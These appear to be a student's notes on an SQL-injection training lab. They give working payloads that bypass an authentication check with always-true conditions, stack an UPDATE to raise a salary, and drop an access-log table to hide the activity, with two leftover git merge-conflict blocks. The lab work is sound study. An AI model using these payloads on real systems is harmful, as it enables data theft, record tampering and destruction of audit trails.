# A1 Injections (Intro)  


I will only post the notes for the parts that require user input here.  

### 2  

You can get the required department with a simple code:  
SELECT department FROM employees WHERE last_name LIKE 'Franco' AND first_name LIKE 'Bob'  

Even easier would be to just go:  
SELECT deparment FROM employees WHERE userid=96134  
But I thought I might not know mr. Franco's userid as it was not provided in the assignment.  

### 3 DML (Data Manipulation Language)  

Includes the most common SQL commands like SELECT, INSERT, UPDATE, DELETE etc.  

Violations:  
Confidentiality and Integrity  

Solution:  
UPDATE employees SET department = 'Sales' WHERE first_name LIKE 'Tobi' AND last_name LIKE 'Barnett'  
USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY AUTH_TAN  
89762	Tobi	Barnett	Sales	77000	TA9LL1  

### 4 DDL (Data Definition Language)  

Creation (CREATE), modifying (ALTER), and dropping (DROP) the structure of database objects.   

Violations:  
Integrity and Availability  

Solution:  
ALTER TABLE employees ADD phone varchar(20);  

### 5 DCL (Data Control Language)

Create privileges to allow users to access and manipulate the database.  
Provide security to database objects.  

Commands like GRANT and REVOKE.  

Violation: Confidentiality and Availability  

Solution:  
GRANT ALTER TABLE TO 'UnauthorizedUser';  

### 9

<<<<<<< HEAD
<img src="./Homework/Pictures/SQLInj9Success.png" width="50%">  
=======
<img src="Homework/Pictures/SQLInj9Success.png" width="50%">  
>>>>>>> 67b99d8e8ba1f817347311a3a37e137cef6e7d7c

### 10  

Could not parse: 0 OR 1=1 to a number  
This returned after trying to pass NaN values to Login_Count. This one might be protected.  

Afterwards tried the values:  
Login_Count = 0  
userid = 0 OR 1=1  

Success.  
<<<<<<< HEAD
<img src="./Homework/Pictures/SQLInj10Success.png" width="50%">  
=======
<img src="Homework/Pictures/SQLInj10Success.png" width="50%">  
>>>>>>> 67b99d8e8ba1f817347311a3a37e137cef6e7d7c

### 11 Confidentiality (Get access to salaries)
  
This was a trial and error run again for me.  
At first I just looked into what my, John Smith's, data looks like.  
Then I had some trouble with the syntax. How to place the quotation marks in the injected code.  
Tried with input:  
Name: Smith' OR 'i'='i'  
TAN: 3SL99A  
This resulted in a failure "malformed string". So I decided to take closer look at the original query:  
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';  
Placing my little piece here it would look like:  
"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i'' AND auth_tan = '3SL99A';  
The issue can be clearly seen in the extra quotation mark after the second 'i'. Even if fixed, the auth_tan would ruin my attempt so a revised version:  
Input: Smith' OR 'i'='i  
TAN: 3SL99A' OR 'i'='i  
The full query is:  
"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i' AND auth_tan = '3SL99A' OR 'i'='i';  
  
This one was a **success** as both test are always true but I did leave some traces of my actions as I used my actual name and TAN number with the injections. I could have input any random strings to be safe. Too late now.  
  
The column headers for later use:  
USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN  

### 12 Integrity (Get a payraise)

This one was a pretty straight forward after understanding the syntax in the previous.  
As we need to change some data in the database I will use the UPDATE and SET commands to achieve my goals.  
So the original query again:  
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';  
  
Input  
Name: Fairy  
TAN: Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A  
  
The query being sent to the server would look like this:  
SELECT * FROM employees WHERE last_name = 'Fairy' AND auth_tan = 'Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A'  
  
A big payraise for John Smith **succesful**.  


### 13  Availabity (Cover the trail)

So the goal is to wipe out the access_log table.    
I'm going to assume this will achieved by using DROP TABLE access_log.  
Once again, first I just wanted to test the form so I just clicked search and was met with a record of my illegal actions. Not cool.  
The SQL query is probably something like this:  
SELECT * FROM access_log WHERE action = '" + action + "';

So let's see:  
Action contains: test'; DROP TABLE access_log  
So the query would be:  
SELECT * FROM access_log WHERE action = 'test'; DROP TABLE access_log ';    
Did not really think this would work and it didn't but wanted to see what happens for educational purposes. 
We seem to have a trailing quotation mark in the SQL query sent to the server.  

Let's comment the quote out:  
Action contains: '; DROP TABLE access_log --  
SELECT * FROM access_log WHERE action = ''; DROP TABLE access_log -- ''

We have **succesfully** covered our trail.  
